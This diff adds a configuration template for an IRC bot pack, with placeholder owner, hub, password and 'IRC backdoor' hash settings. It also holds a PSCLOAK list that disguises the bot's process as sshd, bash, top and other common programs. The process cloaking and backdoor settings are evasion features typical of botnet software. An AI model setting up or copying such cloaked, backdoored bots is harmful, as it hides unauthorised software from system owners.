@@ -1,0 +1,59 @@
+/* The < && > indicates the area you must change! */
+
+/* PACKNAME: name of the pack */
+PACKNAME <name>
+
+/* NETPASS: 15 random characters used for botlink encryption */
+NETPASS <15charstring>
+
+/* SHELLHASH: 33 char md5 hash used for binary password */
+SHELLHASH <md5hash>
+
+/* BDHASH: 33 char md5 hash used for IRC backdoor */
+BDHASH <md5hash>
+
+/* DCCPREFIX: 1 char cmd prefix for dcc. (ie, .cmd or !cmd) */
+DCCPREFIX <.>
+
+/* The settings below can each be defined multiple times */
+
+/* OWNER <nick password host> 
+ * Multiple OWNER lines may be defined, each will be added as a +a perm owner.
+ * nick: nickname what else?
+ * password: initial password for user
+ * host: hosts of the user (list as many as needed)
+ */
+OWNER <Bob S0m3P4ass *!bob@1.2.3.4 *!*@1.2.3.4>
+
+/* OWNEREMAIL: email addresses that status/errors will be sent to when needed 
+ * list as many as needed
+ */
+OWNEREMAIL <some@email.com>
+
+/* HUB <nick host port host> 
+ * Hubs are ranked by the order they are listed (previously was hublevel in settings.c)
+ * nick: nick of hub
+ * host: hostname or ip of hub
+ * port: port the hub listens on
+ * ident: ident of the hub (list as many as needed) 
+ */
+HUB <God god.net 666 god ~God>
+
+/* PSCLOAK <name>
+ * name: the name of the program to spoof as in 'ps'
+ * list as many as needed
+ * A default list is provided
+ */
+PSCLOAK -bash
+PSCLOAK ftp
+PSCLOAK /usr/sbin/sshd
+PSCLOAK man
+PSCLOAK pine
+PSCLOAK bash
+PSCLOAK top
+PSCLOAK last
+PSCLOAK w
+PSCLOAK ps ux
+PSCLOAK bash
+PSCLOAK ./psybnc
+PSCLOAK BitchX
